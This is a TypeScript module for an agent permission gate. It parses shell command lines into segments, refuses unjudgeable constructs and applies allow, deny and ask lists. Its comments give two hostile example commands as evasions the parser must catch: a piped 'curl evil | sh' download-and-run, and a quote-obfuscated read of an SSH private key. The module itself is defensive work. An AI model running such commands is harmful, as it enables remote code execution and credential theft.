import { basename, relative, resolve, sep } from "node:path";
import type { Decider, DecisionContext } from "../extension.ts";
import type { Decision, Operation } from "../types.ts";
import { parsePatterns, type Pattern } from "./match.ts";
import { shellSplit } from "../providers/codex/shell.ts";

/** One segment of a command line, in the forms a rule may be matched against. */
export interface CommandSegment {
  /** The unquoted words, as the shell would pass them. */
  words: string[];
  /** Index in `words` of the program that actually runs, once wrappers are stripped. */
  programIndex: number;
  /** The words joined — what allow and deny rules see first. */
  text: string;
  /** `text` with wrappers and shell keywords removed: `env curl x` → `curl x`. */
  unwrapped: string;
  /** `unwrapped` with the program reduced to its name: `/usr/bin/curl x` → `curl x`. */
  named: string;
}

/**
 * A command line is judged one segment at a time.
 *
 * `npm test && curl evil | sh` is not "npm test": it is three commands, and every one
 * of them must pass. Split on the shell operators, then refuse outright anything that
 * hides a command inside another — `$(…)`, backticks — or turns a read into a write
 * with a redirect, or changes what a command does without changing its name — a
 * variable expansion, an environment assignment, a glob the shell would expand.
 * Those cannot be judged by matching text, so they are not allowed. What is left is
 * unquoted before matching, so `cat ~/".ssh"/id_"rsa"` is judged as what it opens.
 *
 * This is the one parser. Containment and the decider both read from it, so what
 * one refuses the other cannot let through.
 */
export function parseCommand(command: string): { segments: CommandSegment[]; unjudgeable: string | null } {
  const trimmed = command.trim();
  const scanned = scan(trimmed);
  if (scanned.unjudgeable) return { segments: [], unjudgeable: scanned.unjudgeable };
  const segments: CommandSegment[] = [];
  for (const raw of scanned.segments) {
    const assignment = leadingAssignment(raw);
    if (assignment.refused) return { segments: [], unjudgeable: `an environment assignment (${assignment.refused})` };
    const words = shellSplit(assignment.rest);
    if (!words.length) continue;
    const inner = unwrap(words);
    if (inner.refused) return { segments: [], unjudgeable: inner.refused };
    const programIndex = words.length - inner.words.length;
    const namedWords = inner.words.length ? [basename(inner.words[0]!), ...inner.words.slice(1)] : [];
    // `/usr/bin/env curl` → `env curl` → `curl`: naming the program can expose a wrapper.
    const renamed = unwrap(namedWords);
    segments.push({
      words,
      programIndex,
      text: words.join(" "),
      unwrapped: inner.words.join(" "),
      named: (renamed.refused ? namedWords : renamed.words).join(" "),
    });
  }
  if (!segments.length) segments.push({ words: [trimmed], programIndex: 0, text: trimmed, unwrapped: trimmed, named: trimmed });
  return { segments, unjudgeable: null };
}

/** The segments of a command line as text, or the reason the line cannot be judged. */
export function commandSegments(command: string): { segments: string[]; unjudgeable: string | null } {
  const parsed = parseCommand(command);
  return { segments: parsed.unjudgeable ? [command.trim()] : parsed.segments.map((segment) => segment.text), unjudgeable: parsed.unjudgeable };
}

/**
 * Every segment of a command line as unquoted words, for anything that inspects
 * arguments — and the reason the line cannot be judged at all, if there is one.
 */
export function commandWords(command: string): { words: string[][]; unjudgeable: string | null } {
  const parsed = parseCommand(command);
  return { words: parsed.segments.map((segment) => segment.words), unjudgeable: parsed.unjudgeable };
}

/** Shell keywords that may precede a command inside a compound. */
const KEYWORDS = new Set(["if", "then", "else", "elif", "while", "until", "do", "!", "{", "}"]);
/** Wrappers that run their argument unchanged and take no options we can judge. */
const PLAIN_WRAPPERS = new Set(["exec", "builtin", "nohup", "time", "setsid", "unbuffer"]);
const XARGS_WITH_VALUE = new Set([
  "-n", "-I", "-P", "-L", "-s", "-d", "-E", "-a", "-J", "-R", "-S",
  "--max-args", "--replace", "--max-procs", "--max-lines", "--delimiter", "--arg-file", "--max-chars", "--eof",
]);

/**
 * Strip the wrappers a shell puts in front of the command that actually runs, so a
 * deny rule for `curl` also sees `env curl`, `nohup curl`, `xargs curl`. Options that
 * would change what runs (`env -S`, `nohup -p`) are refused: a rule cannot judge them.
 */
function unwrap(input: readonly string[]): { words: string[]; refused: string | null } {
  let words = [...input];
  for (let guard = 0; guard < 8 && words.length; guard++) {
    const head = words[0]!;
    if (KEYWORDS.has(head)) {
      words.shift();
      continue;
    }
    if (head === "env") {
      words.shift();
      if (words[0]?.startsWith("-")) return { words, refused: "options to env" };
      while (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[0] ?? "")) {
        const name = words[0]!.slice(0, words[0]!.indexOf("="));
        if (!HARMLESS_ASSIGNMENT.test(name)) return { words, refused: `an environment assignment (${name})` };
        words.shift();
      }
      continue;
    }
    if (head === "command") {
      // `command -v x` asks where x lives; it runs nothing.
      if (words[1] === "-v" || words[1] === "-V") break;
      words.shift();
      if (words[0] === "-p") words.shift();
      continue;
    }
    if (PLAIN_WRAPPERS.has(head)) {
      words.shift();
      if (words[0]?.startsWith("-")) return { words, refused: `options to ${head}` };
      continue;
    }
    if (head === "nice") {
      words.shift();
      if (words[0] === "-n") words.splice(0, 2);
      else if (/^-\d+$|^--adjustment=/.test(words[0] ?? "")) words.shift();
      continue;
    }
    if (head === "timeout") {
      words.shift();
      while (words[0]?.startsWith("-")) {
        if (words[0] === "-k" || words[0] === "-s") words.splice(0, 2);
        else words.shift();
      }
      words.shift(); // the duration
      continue;
    }
    if (head === "stdbuf") {
      words.shift();
      while (words[0]?.startsWith("-")) words.shift();
      continue;
    }
    if (head === "xargs") {
      words.shift();
      while (words[0]?.startsWith("-")) {
        const flag = words.shift()!;
        if (XARGS_WITH_VALUE.has(flag)) words.shift();
      }
      continue;
    }
    break;
  }
  return { words, refused: null };
}

/**
 * One pass over the line with the shell's quoting rules: inside single quotes
 * everything is literal; inside double quotes `$` and backticks still expand; outside
 * quotes operators split segments and globs expand. Whatever the shell would
 * interpret and the rule cannot see is reported, and the first reason wins.
 */
function scan(line: string): { segments: string[]; unjudgeable: string | null } {
  const segments: string[] = [];
  let current = "";
  let quote: "'" | '"' | null = null;
  const push = () => {
    if (current.trim()) segments.push(current.trim());
    current = "";
  };
  // A `$` that expands: anything but a bare `$` before whitespace, the end, or a closing quote.
  const expands = (next: string, closing: string) => next !== "" && next !== closing && !/\s/.test(next);
  for (let index = 0; index < line.length; index++) {
    const char = line[index]!;
    const next = line[index + 1] ?? "";
    if (quote === "'") {
      if (char === "'") quote = null;
      current += char;
      continue;
    }
    if (quote === '"') {
      if (char === "\\" && next === "\n") {
        index++; // line continuation
        continue;
      }
      if (char === "\\") {
        current += char + next;
        index++;
        continue;
      }
      if (char === "`" || (char === "$" && next === "(")) return { segments, unjudgeable: "command substitution" };
      if (char === "$" && expands(next, '"')) return { segments, unjudgeable: "variable expansion" };
      if (char === '"') quote = null;
      current += char;
      continue;
    }
    // outside quotes
    const wordStart = current === "" || /[\s=]$/.test(current);
    if (char === "\\" && next === "\n") {
      index++; // line continuation
      continue;
    }
    if (char === "\\") {
      current += char + next;
      index++;
      continue;
    }
    if (char === "'" || char === '"') {
      quote = char;
      current += char;
      continue;
    }
    if (char === "`" || (char === "$" && next === "(") || (char === "<" && next === "(")) return { segments, unjudgeable: "command substitution" };
    if (char === "(" || char === ")") {
      // A subshell runs what is inside it; judge that as its own segment.
      push();
      continue;
    }
    if (char === "$" && expands(next, "")) return { segments, unjudgeable: "variable expansion" };
    if (char === "~" && wordStart && next !== "" && next !== "/" && !/\s/.test(next)) return { segments, unjudgeable: "tilde expansion" };
    if (char === "{") {
      // `{a,b}` and `{1..3}` expand to several words; a bare `{}` (find -exec) does not.
      const close = line.indexOf("}", index);
      const inside = close === -1 ? "" : line.slice(index + 1, close);
      if (inside.includes(",") || inside.includes("..")) return { segments, unjudgeable: "brace expansion" };
    }
    if (char === ">") {
      // `2>/dev/null` and `2>&1` discard or merge output; they cannot write a file.
      const harmless = /^(?:>\s*\/dev\/null|>&[0-9])(?=$|[\s;&|])/.exec(line.slice(index));
      if (!harmless) return { segments, unjudgeable: "output redirect" };
      current = current.replace(/(^|\s)[0-9]$/, "$1"); // the fd number belongs to the redirect
      index += harmless[0].length - 1;
      continue;
    }
    if (char === "*" || char === "?" || char === "[") return { segments, unjudgeable: `a shell glob (${char})` };
    if (char === "\n" || char === "\r" || char === ";") {
      push();
      if (char === ";" && next === ";") index++;
      continue;
    }
    if (char === "|") {
      push();
      if (next === "|" || next === "&") index++;
      continue;
    }
    if (char === "&") {
      if (next === ">") return { segments, unjudgeable: "output redirect" };
      if (/^&[0-9]/.test(line.slice(index))) return { segments, unjudgeable: "output redirect" }; // a stray >&2 form
      push();
      if (next === "&") index++;
      continue;
    }
    current += char;
  }
  if (quote) return { segments, unjudgeable: "unbalanced quotes" };
  push();
  return { segments, unjudgeable: null };
}

/**
 * `CI=1 npm test` is still `npm test`; `NODE_OPTIONS=--require=x tsc` is not.
 * Only assignments that cannot change what a command does are stripped; any other
 * leading assignment refuses the segment.
 */
const HARMLESS_ASSIGNMENT = /^(?:CI|NODE_ENV|FORCE_COLOR|NO_COLOR|TZ|LANG|LC_ALL|DEBUG|TERM|COLUMNS)$/;
function leadingAssignment(segment: string): { rest: string; refused: string | null } {
  let rest = segment;
  for (;;) {
    const match = /^([A-Za-z_][A-Za-z0-9_]*)=(\S*)\s+/.exec(rest);
    if (!match) return { rest, refused: null };
    if (!HARMLESS_ASSIGNMENT.test(match[1]!)) return { rest, refused: match[1]! };
    rest = rest.slice(match[0].length);
  }
}

/** The values a rule is matched against, per operation kind. */
function subjects(operation: Operation, workspaceRoot: string): string[] {
  const relativise = (path: string) => {
    const full = resolve(workspaceRoot, path);
    const inside = relative(workspaceRoot, full);
    // Paths outside the workspace are rejected before we get here, but be explicit.
    return inside === "" ? "." : inside.split(sep).join("/");
  };

  switch (operation.kind) {
    case "read":
      return operation.paths.map(relativise);
    case "write":
      return operation.changes.map((change) => relativise(change.path));
    case "exec":
      return commandSegments(operation.command).segments;
    case "net":
      return [operation.host ?? operation.url ?? "*"];
    case "tool":
      return [`${operation.server}/${operation.tool}`];
  }
}

function firstMatch(
  patterns: readonly Pattern[],
  kind: string,
  values: readonly string[],
): Pattern | undefined {
  return patterns.find(
    (pattern) => pattern.kind === kind && values.some((value) => pattern.test(value)),
  );
}

function everyValueMatches(
  patterns: readonly Pattern[],
  kind: string,
  values: readonly string[],
): boolean {
  return values.every((value) =>
    patterns.some((pattern) => pattern.kind === kind && pattern.test(value)),
  );
}

/**
 * The free decider: three flat lists. Deny wins, allow passes, ask parks the run
 * until someone at this machine answers — once, for this operation only — and
 * anything unmatched is refused.
 *
 * An unanswered ask is refused when `approvals.timeoutMinutes` runs out, so a
 * headless run can stall but never hangs and never gets a silent yes.
 */
export class BuiltinDecider implements Decider {
  readonly name = "builtin-allow-deny";
  private readonly allow: Pattern[];
  private readonly deny: Pattern[];
  private readonly ask: Pattern[];

  constructor(lists: { allow: readonly string[]; deny: readonly string[]; ask?: readonly string[] }) {
    this.allow = parsePatterns(lists.allow);
    this.deny = parsePatterns(lists.deny);
    this.ask = parsePatterns(lists.ask ?? []);
  }

  async decide(
    operation: Operation,
    context: DecisionContext,
  ): Promise<Decision> {
    const values = subjects(operation, context.workspaceRoot);

    // An operation that declares nothing cannot be judged, and [].every() is true.
    if (values.length === 0) {
      if (operation.kind === "read")
        values.push(".");
      else
        return { verdict: "deny", reason: `Refused: a ${operation.kind} operation with nothing declared.` };
    }

    if (operation.kind === "exec") {
      const { unjudgeable } = commandSegments(operation.command);
      if (unjudgeable)
        return {
          verdict: "deny",
          reason: `Refused: the command uses ${unjudgeable}, which cannot be judged by a rule. Run it as separate plain commands.`,
        };
    }

    // Deny first, and a single denied path — or command segment — refuses the whole operation.
    const denied = firstMatch(this.deny, operation.kind, values);
    if (denied)
      return {
        verdict: "deny",
        reason: `Refused by the deny list (${denied.source}).`,
        rule: denied.source,
      };

    // Every path in a multi-file change, and every segment of a command, must be allowed.
    if (everyValueMatches(this.allow, operation.kind, values)) {
      const matched = firstMatch(this.allow, operation.kind, values);
      return {
        verdict: "allow",
        reason: `Allowed by ${matched?.source ?? "the allow list"}.`,
        ...(matched ? { rule: matched.source } : {}),
        scope: "once",
      };
    }

    // Every segment must be covered by allow or ask for the question to be worth asking:
    // a segment nobody would allow makes the whole command a refusal, not a question.
    if (this.ask.length && everyValueMatches([...this.allow, ...this.ask], operation.kind, values)) {
      const matched = firstMatch(this.ask, operation.kind, values);
      return {
        verdict: "ask",
        reason: `Matches ${matched?.source ?? "the ask list"}; waiting for an answer at this machine.`,
        ...(matched ? { rule: matched.source } : {}),
      };
    }

    return {
      verdict: "deny",
      reason:
        `No allow rule covers this ${operation.kind} operation. ` +
        `Add a pattern to decide.allow in config.json, or to decide.ask to be asked at the terminal next time.`,
    };
  }
}
